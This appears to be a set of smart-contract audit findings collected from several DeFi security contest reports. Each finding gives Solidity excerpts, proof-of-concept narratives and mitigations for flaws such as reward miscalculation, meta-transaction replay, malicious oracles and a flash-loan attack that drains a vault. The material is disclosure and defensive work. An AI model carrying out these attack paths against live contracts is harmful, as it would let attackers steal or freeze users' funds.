uint256 userI = userReward[_pid][_index][_account].integral;
if (userI < reward.integral) {
    userReward[_pid][_index][_account].integral = reward.integral;
    claimContract.pushReward(
        _account,
        reward.token,
        (_balance * (reward.integral - userI)) / 1e20
    );
}

//update remaining reward here since balance could have changed if claiming
if (bal != reward.remaining) {
    reward.remaining = uint128(bal);
}

```
The problems in the current implementation:

reward.remaining is not a global state; the reward.remaining of other rewards with the same rewardToken are not updated;
bal should be refreshed before reward.remaining = uint128(bal);;
L175 should not use balanceOf but take the diff before and after getReward().

Proof of Concept

convexPool[1] is incentivized with CRV as the reward token, 1000 lpToken can get 10 CRV per day;

convexPool[2] is incentivized with CRV as the reward token, 1000 lpToken can get 20 CRV per day.


Alice deposits 1,000 lpToken to _pid = 1


1 day later, Alice deposits 500 lpToken to _pid = 1


convexPool getReward() sends 10 CRV as reward to contract

d_reward = 10, 2 CRV sends to treasury, 8 CRV send to claimContract

rewards[1][0].remaining = 10


0.5 day later, Alice deposits 500 lpToken to _pid = 1, and the tx will fail:


convexPool getReward() sends 7.5 CRV as reward to contract

reward.remaining = 10
bal = 7.5

bal - reward.remaining will fail due to underflow


0.5 day later, Alice deposits 500 lpToken to _pid = 1, most of the reward tokens will be left in the contract:


convexPool getReward() sends 15 CRV as reward to the contract;

d_reward = bal - reward.remaining = 5
1 CRV got sent to treasury, 4 CRV sent to claimContract, 10 CRV left in the contract;
rewards[1][0].remaining = 15

Expected Results:
All the 15 CRV get distributed: 3 CRV to the treasury, and 12 CRV to claimContract.
Actual Results:
Only 5 CRV got distributed. The other 10 CRV got left in the contract which can be frozen in the contract, see below for the details:


Bob deposits 1,000 lpToken to _pid = 2


convexPool getReward() sends 0 CRV as reward to the contract

d_reward = bal - reward.remaining = 10
2 CRV sent to treasury, 8 CRV sent to claimContract without calling pushReward(), so the 8 CRV are now frozen in claimContract;
rewards[2][0].remaining = 10

Impact

The two most important methods: deposit() and withdraw() will frequently fail as the tx will revert at _calcRewardIntegral();
Rewards distributed to users can often be fewer than expected;
If there are different pools that use the same token as rewards, part of the rewards can be frozen at claimContract and no one can claim them.

Recommended Mitigation Steps
Consider comparing the balanceOf reward token before and after getReward() to get the actual rewarded amount, and reward.remaining should be removed.
leekt (Concur) confirmed
Alex the Entreprenerd (judge) commented:

The warden has shown how _calcRewardIntegral can be broken in multiple ways.
While I believe a set of similar findings have been reported, this one is extremely well written so I think this can stand on it's own.
Because _calRewardIntegral is a core functionality of the contract (giving out reward) and the warden has shown how it can be broken, I agree with High Severity.




## [H-08]  "MasterChef.sol Users won’t be able to receive the concur rewards"

Submitted by WatchPug, also found by hickuphh3 and leastwood
According to:

README
Implementation of deposit(): /contracts/MasterChef.sol#L157-L180

MasterChef is only recording the deposited amount in the states, it's not actually holding the depositToken.
depositToken won't be transferred from _msgSender() to the MasterChef contract.
Therefore, in updatePool() L140 lpSupply = pool.depositToken.balanceOf(address(this)) will always be 0. And the updatePool() will be returned at L147.
MasterChef.sol#L135-L154
```solidity
function updatePool(uint _pid) public {
    PoolInfo storage pool = poolInfo[_pid];
    if (block.number <= pool.lastRewardBlock) {
        return;
    }
    uint lpSupply = pool.depositToken.balanceOf(address(this));
    if (lpSupply == 0 || pool.allocPoint == 0) {
        pool.lastRewardBlock = block.number;
        return;
    }
    if(block.number >= endBlock) {
        pool.lastRewardBlock = block.number;
        return;
    }        
uint multiplier = getMultiplier(pool.lastRewardBlock, block.number);
uint concurReward = multiplier.mul(concurPerBlock).mul(pool.allocPoint).div(totalAllocPoint);
pool.accConcurPerShare = pool.accConcurPerShare.add(concurReward.mul(_concurShareMultiplier).div(lpSupply));
pool.lastRewardBlock = block.number;

}
```
Impact

The MasterChef contract fail to implement the most essential function;
Users won't be able to receive any Concur rewards from MasterChef;

Recommended Mitigation Steps
Consider creating a receipt token to represent the invested token and use the receipt tokens in MasterChef.
See: https://github.com/convex-eth/platform/blob/883ffd4ebcaee12e64d18f75bdfe404bcd900616/contracts/contracts/Booster.sol#L272-L277
ryuheimat (Concur) confirmed
Alex the Entreprenerd (judge) commented:

The warden has identified a logical flaw in the Masterchef contract.
The contract is expecting lpTokens (deposited in another depositor contract) to be in the Masterchef at the time in which updatePool is called.
However, due to the fact that the lpToken will be somewhere else, a more appropriate check would be to ask the depositor contract for the total supply.
Given this finding, the Masterchef contract will always reward 0 tokens.
This should classify the finding as Medium Severity (loss of Yield).
However, because the finding shows how this can happen reliably, and effectively breaks the purpose of the contract, I believe High Severity to be more appropriate.




## [H-04]  "Deleting nft Info can cause users’ nft.unpaidRewards to be permanently erased"

Submitted by WatchPug, also found by 0xDjango and hyh
LiquidityFarming.sol#L229-L253
```solidity
function withdraw(uint256 _nftId, address payable _to) external whenNotPaused nonReentrant {
    address msgSender = _msgSender();
    uint256 nftsStakedLength = nftIdsStaked[msgSender].length;
    uint256 index;
    for (index = 0; index < nftsStakedLength; ++index) {
        if (nftIdsStaked[msgSender][index] == _nftId) {
            break;
        }
    }
require(index != nftsStakedLength, "ERR__NFT_NOT_STAKED");
nftIdsStaked[msgSender][index] = nftIdsStaked[msgSender][nftIdsStaked[msgSender].length - 1];
nftIdsStaked[msgSender].pop();

_sendRewardsForNft(_nftId, _to);
delete nftInfo[_nftId];

(address baseToken, , uint256 amount) = lpToken.tokenMetadata(_nftId);
amount /= liquidityProviders.BASE_DIVISOR();
totalSharesStaked[baseToken] -= amount;

lpToken.safeTransferFrom(address(this), msgSender, _nftId);

emit LogWithdraw(msgSender, baseToken, _nftId, _to);

}
```
LiquidityFarming.sol#L122-L165
```solidity
function _sendRewardsForNft(uint256 _nftId, address payable _to) internal {
    NFTInfo storage nft = nftInfo[_nftId];
    require(nft.isStaked, "ERR__NFT_NOT_STAKED");
(address baseToken, , uint256 amount) = lpToken.tokenMetadata(_nftId);
amount /= liquidityProviders.BASE_DIVISOR();

PoolInfo memory pool = updatePool(baseToken);
uint256 pending;
uint256 amountSent;
if (amount > 0) {
    pending = ((amount * pool.accTokenPerShare) / ACC_TOKEN_PRECISION) - nft.rewardDebt + nft.unpaidRewards;
    if (rewardTokens[baseToken] == NATIVE) {
        uint256 balance = address(this).balance;
        if (pending > balance) {
            unchecked {
                nft.unpaidRewards = pending - balance;
            }
            (bool success, ) = _to.call{value: balance}("");
            require(success, "ERR__NATIVE_TRANSFER_FAILED");
            amountSent = balance;
        } else {
            nft.unpaidRewards = 0;
            (bool success, ) = _to.call{value: pending}("");
            require(success, "ERR__NATIVE_TRANSFER_FAILED");
            amountSent = pending;
        }
    } else {
        IERC20Upgradeable rewardToken = IERC20Upgradeable(rewardTokens[baseToken]);
        uint256 balance = rewardToken.balanceOf(address(this));
        if (pending > balance) {
            unchecked {
                nft.unpaidRewards = pending - balance;
            }
            amountSent = _sendErc20AndGetSentAmount(rewardToken, balance, _to);
        } else {
            nft.unpaidRewards = 0;
            amountSent = _sendErc20AndGetSentAmount(rewardToken, pending, _to);
        }
    }
}
nft.rewardDebt = (amount * pool.accTokenPerShare) / ACC_TOKEN_PRECISION;
emit LogOnReward(_msgSender(), baseToken, amountSent, _to);

}
```
When withdraw() is called, _sendRewardsForNft(_nftId, _to) will be called to send the rewards.
In _sendRewardsForNft(), when address(this).balance is insufficient at the moment, nft.unpaidRewards = pending - balance will be recorded and the user can get it back at the next time.
However, at L244, the whole nftInfo is being deleted, so that nft.unpaidRewards will also get erased.
There is no way for the user to get back this unpaidRewards anymore.
Recommended Mitigation Steps
Consider adding a new parameter named force for withdraw(), require(force || unpaidRewards == 0) before deleting nftInfo.
ankurdubey521 (Biconomy) confirmed and commented:

Great catch! Thanks a lot for bringing these up.
HP-25: C4 Audit Fixes, Dynamic Fee Changes bcnmy/hyphen-contract#42

pauliax (judge) commented:

Great find, deserves a severity of high as it may incur in funds lost for the users.

KenzoAgada (warden) commented:

Shouldn't this be medium severity, as only rewards are lost and not original user funds?
As the risk TLDR says -
2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.
3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).
There are other lost-rewards issues that have been classified as high, this questions pertains to them as well.

0xleastwood (warden) commented:

I would be inclined to keep this as high risk as it is less about the protocol leaking value and more about rewards being completely wiped and lost forever. I would argue, the user's assets at this point in time DO include all unpaid rewards, so it is perfectly reasonable to treat this as high risk.

pauliax (judge) commented:

Agree that the boundaries are not very clear, this issue might fall somewhere between Medium and High severities. But my initial thought was similar to that of @0xleastwood, the rewards already belong to the user, and losing them will make the user lose on time and other opportunities. Also, this is not a hypothetical attack scenario, but a very real valid execution path, thus I think a high severity is fine here.




## [H-01]  "Incorrect strike price displayed in name/symbol of qToken"

Submitted by rayn
_slice() in options/QTokenStringUtils.sol cut a string into string[start:end] However, while fetching bytes, it uses bytes(_s)[_start+1] instead of bytes(_s)[_start+i]. This causes the return string to be composed of _s[start]*(_end-_start). The result of this function is then used to represent the decimal part of strike price in name/symbol of qToken, leading to potential confusion over the actual value of options.
Proof of Concept
ERC20 tokens are usually identified by their name and symbol. If the symbols are incorrect, confusions may occur. Some may argue that even if names and symbols are not accurate, it is still possible to identify correct information/usage of tokens by querying the provided view functions and looking at its interactions with other contracts. However, the truth is many users of those tokens are not very tech savvy, and it is reasonable to believe a large proportion of users are not equipped with enough knowledge, or not willing to dig further than the plain symbols and names. This highlights the importance of maintaining a correct facade for ERC20 tokens.
The bug demonstrated here shows that any qToken with decimals in its strike price will be misdisplayed, and the maximal difference between actual price and displayed one can be up to 0.1 BUSD.
The exploit can be outlined through the following steps:


Alice created a call option with strike price 10000.90001. The expected symbol should for this qToken should be : ROLLA WETH 31-December-2022 10000.90001 Call


Both _qTokenName() and _qTokenSymbol() in options/QTokenStringUtils.sol use _displayedStrikePrice() to get the strike price string which should be 10000.90001


https://github.com/RollaProject/quant-protocol/blob/98639a3/contracts/options/QTokenStringUtils.sol#L38
https://github.com/RollaProject/quant-protocol/blob/98639a3/contracts/options/QTokenStringUtils.sol#L90
    function _qTokenName(
        address _quantConfig,
        address _underlyingAsset,
        address _strikeAsset,
        uint256 _strikePrice,
        uint256 _expiryTime,
        bool _isCall
    ) internal view virtual returns (string memory tokenName) {
        string memory underlying = _assetSymbol(_quantConfig, _underlyingAsset);
        string memory displayStrikePrice = _displayedStrikePrice(
            _strikePrice,
            _strikeAsset
        );

        ...

        tokenName = string(
            abi.encodePacked(
                "ROLLA",
                " ",
                underlying,
                " ",
                _uintToChars(day),
                "-",
                monthFull,
                "-",
                Strings.toString(year),
                " ",
                displayStrikePrice,
                " ",
                typeFull
            )
        );
    }

```
function _qTokenSymbol(
    address _quantConfig,
    address _underlyingAsset,
    address _strikeAsset,
    uint256 _strikePrice,
    uint256 _expiryTime,
    bool _isCall
) internal view virtual returns (string memory tokenSymbol) {
    string memory underlying = _assetSymbol(_quantConfig, _underlyingAsset);
    string memory displayStrikePrice = _displayedStrikePrice(
        _strikePrice,
        _strikeAsset
    );

    // convert the expiry to a readable string
    (uint256 year, uint256 month, uint256 day) = DateTime.timestampToDate(
        _expiryTime
    );

    // get option type string
    (string memory typeSymbol, ) = _getOptionType(_isCall);

    // get option month string
    (string memory monthSymbol, ) = _getMonth(month);

    /// concatenated symbol string
    tokenSymbol = string(
        abi.encodePacked(
            "ROLLA",
            "-",
            underlying,
            "-",
            _uintToChars(day),
            monthSymbol,
            _uintToChars(year),
            "-",
            displayStrikePrice,
            "-",
            typeSymbol
        )
    );
}

```

_displayedStrikePrice() combines the quotient and the remainder to form the strike price string. The remainder use _slice to compute. In this case, the quotient is 10000 and the remainder is 90001

https://github.com/RollaProject/quant-protocol/blob/98639a3/contracts/options/QTokenStringUtils.sol#L136
function _displayedStrikePrice(uint256 _strikePrice, address _strikeAsset)
        internal
        view
        virtual
        returns (string memory)
    {
        uint256 strikePriceDigits = ERC20(_strikeAsset).decimals();
        uint256 strikePriceScale = 10**strikePriceDigits;
        uint256 remainder = _strikePrice % strikePriceScale;
        uint256 quotient = _strikePrice / strikePriceScale;
        string memory quotientStr = Strings.toString(quotient);

        if (remainder == 0) {
            return quotientStr;
        }

        uint256 trailingZeroes;
        while (remainder % 10 == 0) {
            remainder /= 10;
            trailingZeroes++;
        }

        // pad the number with "1 + starting zeroes"
        remainder += 10**(strikePriceDigits - trailingZeroes);

        string memory tmp = Strings.toString(remainder);
        tmp = _slice(tmp, 1, (1 + strikePriceDigits) - trailingZeroes);

        return string(abi.encodePacked(quotientStr, ".", tmp));
    }


However inside the loop of _slice(), slice[i] = bytes(_s)[_start + 1]; lead to an incorrect string, which is 90001

https://github.com/RollaProject/quant-protocol/blob/98639a3/contracts/options/QTokenStringUtils.sol#L206
    function _slice(
        string memory _s,
        uint256 _start,
        uint256 _end
    ) internal pure virtual returns (string memory) {
        uint256 range = _end - _start;
        bytes memory slice = new bytes(range);
        for (uint256 i = 0; i < range; ) {
            slice[i] = bytes(_s)[_start + 1];
            unchecked {
                ++i;
            }
        }

        return string(slice);
    }


The final qtoken name now becomes ROLLA WETH 31-December-2022 10000.99999 Call, which results in confusion over the actual value of options.

Recommended Mitigation Steps
Fix the bug in the _slice()
    function _slice(
        string memory _s,
        uint256 _start,
        uint256 _end
    ) internal pure virtual returns (string memory) {
        uint256 range = _end - _start;
        bytes memory slice = new bytes(range);
        for (uint256 i = 0; i < range; ) {
            slice[i] = bytes(_s)[_start + i];
            unchecked {
                ++i;
            }
        }

        return string(slice);
    }

0xca11 (Rolla) confirmed, resolved, and commented:

Resolved in RollaProject/quant-protocol#77




## [H-04]  "EIP712MetaTransaction.executeMetaTransaction() failed txs are open to replay attacks"

Submitted by WatchPug
Any transactions that fail based on some conditions that may change in the future are not safe to be executed again later (e.g. transactions that are based on others actions, or time-dependent etc).
In the current implementation, once the low-level call is failed, the whole tx will be reverted and so that _nonces[metaAction.from] will remain unchanged.
As a result, the same tx can be replayed by anyone, using the same signature.
EIP712MetaTransaction.sol#L86
```solidity
    function executeMetaTransaction(
        MetaAction memory metaAction,
        bytes32 r,
        bytes32 s,
        uint8 v
    ) external payable returns (bytes memory) {
        require(
            _verify(metaAction.from, metaAction, r, s, v),
            "signer and signature don't match"
        );
    uint256 currentNonce = _nonces[metaAction.from];

    // intentionally allow this to overflow to save gas,
    // and it's impossible for someone to do 2 ^ 256 - 1 meta txs
    unchecked {
        _nonces[metaAction.from] = currentNonce + 1;
    }

    // Append the metaAction.from at the end so that it can be extracted later
    // from the calling context (see _msgSender() below)
    (bool success, bytes memory returnData) = address(this).call(
        abi.encodePacked(
            abi.encodeWithSelector(
                IController(address(this)).operate.selector,
                metaAction.actions
            ),
            metaAction.from
        )
    );

    require(success, "unsuccessful function call");
    emit MetaTransactionExecuted(
        metaAction.from,
        payable(msg.sender),
        currentNonce
    );
    return returnData;
}

```
See also the implementation of OpenZeppelin's MinimalForwarder:
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.5.0/contracts/metatx/MinimalForwarder.sol#L42-L66
Proof of Concept
Given:

The collateral is USDC;

Alice got 10,000 USDC in the wallet.


Alice submitted a MetaTransaction to operate() and _mintOptionsPosition() with 10,000 USDC;

Before the MetaTransaction get executed, Alice sent 1,000 USDC to Bob;
The MetaTransaction submited by Alice in step 1 get executed but failed;
A few days later, Bob sent 1,000 USDC to Alice;
The attacker can replay the MetaTransaction failed to execute at step 3 and succeed.

Alice's 10,000 USDC is now been spent unexpectedly against her will and can potentially cause fund loss depends on the market situation.
Recommended Mitigation Steps
Failed txs should still increase the nonce.
While implementating the change above, consider adding one more check to require sufficient gas to be paid, to prevent "insufficient gas griefing attack" as described in this article.
0xca11 (Rolla) confirmed, resolved, and commented:

Meta transactions replay and insufficient gas griefing attacks are now prevented since RollaProject/quant-protocol#80.


Medium Risk Findings (10)


## [H-02]  "All swapping functions lack checks for returned tokens"

Submitted by 0xDjango, also found by GeekyLumberjack and pmerkleplant
GenericSwapFacet.sol#L23-L30
LibSwap.sol#L48
Every function that stems from the GenericSwapFacet lacks checks to ensure that some tokens have been returned via the swaps. In LibSwap.sol in the swap() function, the swap call is sent to the target DEX. A return of success is required, otherwise the operation will revert.
Each "inner" swap via LibSwap.sol lacks output checks and also the "outer" swapTokensGeneric() via GenericSwapFacet.sol lacks a final check as well.
There is a possibility that the calldata is accidently populated with a function in the target router that is not actually performing any swapping functionality, getAmountsOut() for example. The function will return true, but no new returned tokens will be present in the contract. Meanwhile, the contract has already received the user's fromTokens directly.
Recommended Mitigation Steps
This would be a potential use case of using function signature whitelists as opposed to contract address whitelists, as noted as a possibility by the LiFi team.
Otherwise, the following require statement in swapTokensGeneric() would ensure that at least a single token was received:
require(LibAsset.getOwnBalance(_swapData.receivingAssetId) - toAmount) > 0, "No tokens received")
H3xept (Li.Fi) resolved and commented:

Fixed in lifinance/lifi-contracts@3a42484dda8bafcfd122c8aa3b61d3766d545bf9

gzeon (judge) commented:

Sponsor confirmed with fix.


Medium Risk Findings (13)


## [H-09]  "Bad debts should not continue to accrue interest"

Submitted by WatchPug
NFTVault.sol#L844-L851
```solidity
uint256 debtAmount = _getDebtAmount(_nftIndex);
require(
    debtAmount >= _getLiquidationLimit(_nftIndex),
    "position_not_liquidatable"
);
// burn all payment
stablecoin.burnFrom(msg.sender, debtAmount);
```
In the current design/implementation, the liquidator must fully repay the user's outstanding debt in order to get the NFT.
When the market value of the NFT fell rapidly, the liquidators may not be able to successfully liquidate as they can not sell the NFT for more than the debt amount.
In that case, the protocol will have positions that are considered bad debts.
However, these loans, which may never be repaid, are still accruing interest. And every time the DAO collects interest, new stablecoin will be minted.
When the proportion of bad debts is large enough since the interest generated by these bad debts is not backed. It will damage the authenticity of the stablecoin.
Proof of Concept
Given:

NFT 1 worth 30,000 USD
creditLimitRate = 60%
liquidationLimitRate = 50%

debtInterestApr = 10%


Alice borrowed 10,000 USD with NFT #1;

After 1 year, NFT 1's market value in USD has suddenly dropped to 10,000 USD, no liquidator is willing to repay 11,000 USD for NFT #1;
The DAO collect() and minted 1,000 stablecoin;
After 1 year, the DAO call collect() will mint 1,100 stablecoin. and so on...

Recommended Mitigation Steps
Consider adding a stored value to record the amount of bad debt, and add a public function that allows anyone to mark a bad debt to get some reward. and change accrue to:
```solidity
uint256 internal badDebtPortion;
function accrue() public {
    uint256 additionalInterest = _calculateAdditionalInterest();
totalDebtAccruedAt = block.timestamp;

totalDebtAmount += additionalInterest;

uint256 collectibleInterest = additionalInterest * (totalDebtPortion - badDebtPortion) / totalDebtPortion;
totalFeeCollected += collectibleInterest;

}
```
spaghettieth (JPEG'd) acknowledged, but disagreed with High severity
LSDan (judge) commented:

I agree with the warden. Left unchecked, this issue is almost certain to occur and will cause substantial negative impacts on the protocol. The only way this would not occur is if the NFT market never crashes.


Medium Risk Findings (11)


## [H-01]  "Cross-chain smart contract calls can revert but source chain tokens remain burnt and are not refunded"

Submitted by sseefried, also found by Chom
Smart contract calls often revert. In such cases any ether sent along with the transaction is returned and sometimes the remaining gas (depending on whether an assert caused the reversion or not).
For contracts involving ERC20 tokens it is also expected that, should a contract call fail, one's tokens are not lost/transferred elsewhere.
The callContractWithToken function does not appear to take contract call failure on the destination chain into account, even though this could be quite a common occurrence.
Tokens are burned on line 105 but there is no mechanism in the code base to return these burned tokens in the case that the contract call fails on the destination chain.
The impact is that users of the Axelar Network can lose funds.
Proof of Concept
I have put together an executable Proof of Concept in a fork of the repo.
File DestinationChainContractCallFails.js implements a test that attempts to call a token swap function on the destination chain. The swap function was provided as part of the competition repo. Given a certain amount of token A it returns twice as much of token B.
In the test I have provided the contract call on the destination chain fails because there is simply not enough of token B in the TokenSwapper contract to transfer to the user. This might be rare in practice -- since adequate liquidity would generally be provided by the contract -- but cross-chain contract calls are unlikely to be limited to token swaps only! I specifically chose this example to show that cross-chain contract calls can fail even in the cases that Axelar have already considered in their test suite.
In the unit test you will find:

Lines of note have been prefixed with sseefried:
The test is a little strange in that it succeeds because it expects a revert. This happens on line 380
I took the liberty of modifying the TokenSwapper contract slightly here, in order to show that the contract call reverts because of a lack of token B.
The amount of token A on line 201 can be modified to be a smaller value. Doing so, and re-running the test, will result in a test failure which means that the contract call did not revert i.e. the contract call on the destination chain succeeded. This shows that, before the change, the revert was due to a lack of token B in the TokenSwapper contract.
Lines 388-389 show that, in the case of a revert on the destination chain, the tokens remain burnt on the source chain.

Recommended Mitigation Steps
When making a credit card purchase it is common for transactions to remain in a "pending" state until eventually finalised. Often one's available bank balance will decrease the moment the purchase has been approved. Then one of
two things happens:

the transaction is finalised and the balance becomes the same as the available balance
the transaction fails and the amount is refunded

I suggest a similar design for cross-chain contract calls, with one major difference: the token should still be burned on the source chain but it should be re-minted and refunded in case of a contract call failure on the destination chain. The steps would be roughly this:

User calls AxelarGateway.callContractWithToken() and tokens are burned
Steps 3 - 8 from the competition page occur as normal.
However, the call to executeWithToken in step 8 now fails. This is monitored by the Axelar Network and a new event e.g. ContractCalledFailed is emitted on the destination chain.
One the source chain the Axelar Network emits a new event e.g. ContractCallFailedWithRefund. This causes a re-minting of the tokens and a refund to the user to occur. The event should also be observable by the user. It should contain a reason for the contract call failure so that they are informed as to why it failed

deluca-mike (Axelar) acknowledged and commented:

In this situation, the validators can still mint/transfer the user back their tokens on the source chain, so there is no real loss. There does lack an "official" way to alert the validators of this, but it can be handled entirely by off-chain micro-services and whatnot. In the future, as ERC20 transfers are pushed out of the contract as handled as separate application on top of the generic cross-chain calls, a mechanism can be implemented to send a message back to the source chain to release/mint the tokens back to the user.

0xean (judge) increased severity to High and commented:

Upgrading this issue from Medium to High Severity 
3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).
While the sponsor does mention there is a possible way that this could be handled in the future, currently this risk exists in the system today and doesn't have a proper or official mitigation in place.


Medium Risk Findings (4)


## [H-01]  "Avoidance of Liquidation Via Malicious Oracle"

Submitted by BowTiedWardens, also found by gzeon, and hyh
Issue: Arbitrary oracles are permitted on construction of loans, and there is no check that the lender agrees to the used oracle.
Consequences: A borrower who requests a loan with a malicious oracle can avoid legitimate liquidation.
Proof of Concept

Borrower requests loan with an malicious oracle
Lender accepts loan unknowingly
Borrowers's bad oracle is set to never return a liquidating rate on oracle.get call.
Lender cannot call removeCollateral to liquidate the NFT when it should be allowed, as it will fail the check on L288
To liquidate the NFT, the lender would have to whitehat along the lines of H-01, by atomically updating to an honest oracle and calling removeCollateral.

Mitigations

Add require(params.oracle == accepted.oracle) as a condition in _lend
Consider only allowing whitelisted oracles, to avoid injection of malicious oracles at the initial loan request stage

cryptolyndon (AbraNFT) confirmed and commented:

Oracle not compared to lender agreed value: confirmed, and I think this is the first time I've seen this particular vulnerability pointed out. Not marking the entire issue as a duplicate for that reason.
Oracle not checked on loan request: Not an issue, first reported in #62.




## [H-02]  "Fund loss or theft by attacker with creating a flash loan and setting SuperVault as receiver so executeOperation() will be get called by lendingPool but with attackers specified params"

Submitted by unforgiven, also found by Picodes
According to Aave documentation, when requesting flash-loan, it's possible to specify a receiver, so function executeOperation() of that receiver will be called by lendingPool.
https://docs.aave.com/developers/v/2.0/guides/flash-loans
In the SuperVault there is no check to prevent this attack so attacker can use this and perform  griefing attack and make miner contract lose all its funds. or he can create specifically crafted params so when executeOperation() is called by lendingPool, attacker could steal vault's user funds.
Proof of Concept
To exploit this attacker will do this steps:

will call Aave lendingPool to get a flash-loan and specify SuperVault as receiver of flash-loan. and also create a specific params that invoke Operation.REBALANCE action to change user vault's collateral.
lendingPool will call executeOperation() of SuperVault with attacker specified data.
executeOperation() will check msg.sender and will process the function call which will cause some dummy exchanges that will cost user exchange fee and flash-loan fee.
attacker will repeat this attack until user losses all his funds.

  function executeOperation(
    address[] calldata assets,
    uint256[] calldata amounts,
    uint256[] calldata premiums,
    address,
    bytes calldata params
  ) external returns (bool) {
    require(msg.sender == address(lendingPool), "SV002");
    (Operation operation, bytes memory operationParams) = abi.decode(params, (Operation, bytes));
    IERC20 asset = IERC20(assets[0]);
    uint256 flashloanRepayAmount = amounts[0] + premiums[0];
    if (operation == Operation.LEVERAGE) {
      leverageOperation(asset, flashloanRepayAmount, operationParams);
    }
    if (operation == Operation.REBALANCE) {
      rebalanceOperation(asset, amounts[0], flashloanRepayAmount, operationParams);
    }
    if (operation == Operation.EMPTY) {
      emptyVaultOperation(asset, amounts[0], flashloanRepayAmount, operationParams);
    }

    asset.approve(address(lendingPool), flashloanRepayAmount);
    return true;
  }

To steal user fund in SupperVault attacker needs more steps. in all these actions (Operation.REBALANCE, Operation.LEVERAGE, Operation.EMPTY) contract will call aggregatorSwap() with data that are controlled by attacker.
  function aggregatorSwap(
    uint256 dexIndex,
    IERC20 token,
    uint256 amount,
    bytes memory dexTxData
  ) internal {
    (address proxy, address router) = _dexAP.dexMapping(dexIndex);
    require(proxy != address(0) && router != address(0), "SV201"); 
    token.approve(proxy, amount);
    router.call(dexTxData);
  }

Attacker can put special data in dexTxData that make contract to do an exchange with bad price. To do this, attacker will create a smart contract that will do this steps:

manipulate price in exchange with flash loan.
make a call to executeOperation() by Aave flash-loan with receiver and specific params so that SuperVault will make calls to manipulated exchange for exchanging.
do the reverse of #1 and pay the flash-loan and steal the user fund.

The details are:
Attacker can manipulate swapping pool price with flash-loan, then Attacker will create specific params and perform steps 1 to 4. so contract will try to exchange tokens and because of attacker price manipulation and specific dexTxData, contract will have bad deals.
After that, attacker can reverse the process of swap manipulation and get his  flash-loan tokens and some of SuperVault funds and. then pay the flash-loan.
Tools Used
VIM
Recommended Mitigation Steps
There should be some state variable which stores the fact that SuperVault imitated flash-loan.
When contract tries to start flash-loan, it sets the isFlash to True and executeOperation() only accepts calls if isFlash is True. and after the flash loan code will set isFlash to False.
m19 (Mimo DeFi) confirmed and commented:

We definitely confirm this issue and intend to fix it.


Medium Risk Findings (5)


## [H-02]  "Inefficiency in the Dutch Auction due to lower duration"

Submitted by hubble, also found by Hawkeye and sseefried
The vulnerability or bug is in the implementation of the function getDutchAuctionStrike()
The AUCTION_DURATION is defined as 24 hours, and consider that the dutchAuctionReserveStrike (or reserveStrike) will never be set to 0 by user.
Now if a vault is created with startingStrike value of 55 and reserveStrike of 13.5 , the auction price will drop from 55 to 13.5 midway at \~12 hours.
So, after 12 hours from start of auction, the rate will be constant at reserveStrike of 13.5, and remaining time of 12 hours of auction is a waste.
Some other examples :
startStrike, reserveStrike, time-to-reach-reserveStrike
55 , 13.5  , ~12 hours
55 , 5     , ~16.7 hours
55 , 1.5   , ~20 hours
5  , 1.5   , ~11 hours

Impact
The impact is high wrt Usability, where users have reduced available time to participate in the auction (when price is expected to change).
The vault-Creators or the option-Buyers may or may not be aware of this inefficiency, i.e., how much effective time is available for auction.
Proof of Concept
Contract : Cally.sol
Function : getDutchAuctionStrike ()
Recommended Mitigation Steps
The function getDutchAuctionStrike() can be modified such that price drops to the reserveStrike exactly at 24 hours from start of auction.
        /*
            delta = max(auctionEnd - currentTimestamp, 0)
            progress = delta / auctionDuration
            auctionStrike = progress^2 * (startingStrike - reserveStrike)             << Changes here
            strike = auctionStrike + reserveStrike                                    << Changes here
        */
        uint256 delta = auctionEndTimestamp > block.timestamp ? auctionEndTimestamp - block.timestamp : 0;
        uint256 progress = (1e18 * delta) / AUCTION_DURATION;
        uint256 auctionStrike = (progress * progress * (startingStrike-reserveStrike)) / (1e18 * 1e18);

        strike = auctionStrike + reserveStrike;

outdoteth (Cally) confirmed, disagreed with severity and commented:

We think this should be bumped to high severity. It would be easy for a user to create an auction that declines significantly faster than what they would have assumed - even over 1 or 2 blocks. It makes no sense for the auction to ever behave in this way and would result in options getting filled at very bad prices for the creator of the vault.

outdoteth (Cally) resolved:

The fix for this issue is here: https://github.com/outdoteth/cally/pull/2

HardlyDifficult (judge) increased severity to High and commented:

The sponsor comment here makes sense. Agree with (1) High since this can potentially be very detrimental to the promise of this protocol.




## [H-02]  "Total Supply is not guaranteed and is not deterministic."

Submitted by Picodes, also found by scaraven
The actual total supply of the token is random and depends on when _executeInflationRateUpdate is executed.
Proof of Concept
The README and tokenomic documentation clearly states that “The token supply is limited to a total of 268435456 tokens.” However when executing _executeInflationRateUpdate, it first uses the current inflation rate to update the total available before checking if it needs to be reduced.
Therefore if no one mints or calls executeInflationRateUpdate for some time around the decay point, the inflation will be updated using the previous rate so the  totalAvailableToNow will grow too much.
Mitigation Steps
You should do
js
totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastEvent));
Only if the condition block.timestamp >= lastInflationDecay + _INFLATION_DECAY_PERIOD is false.
Otherwise you should do
js
totalAvailableToNow += (currentTotalInflation * (lastInflationDecay + _INFLATION_DECAY_PERIOD - lastEvent));
Then update the rates, then complete with
js
totalAvailableToNow += (currentTotalInflation * (block.timestamp - lastInflationDecay + _INFLATION_DECAY_PERIOD));
Note that as all these variables are either constants either already loaded in memory this is super cheap to do.
danhper (Backd) confirmed, but disagreed with severity and commented:

I believe this should actually be high severity

Alex the Entreprenerd (judge) increased severity to High and commented:

The warden has identified the lack of an upper bound on the inflation math which would make it so that more than the expected supply cap of the token could be minted.
The sponsor agrees that this should be of High Severity.
Because this breaks the protocol stated invariant of a specific cap of 268435456 tokens, I agree with High Severity.


Medium Risk Findings (18)


## [H-03]  "PARENT_CANNOT_CONTROL can be bypassed by maliciously unwrapping parent node"

Submitted by PwnedNoMore, also found by panprog, and zzzitron
NameWrapper.sol#L356
NameWrapper.sol#L295
ENSRegistry.sol#L74
By design, for any subdomain, as long as its PARENT_CANNOT_CONTROL fuse is burnt (and does not expire), its parent should not be able to burn its fuses or change its owner.
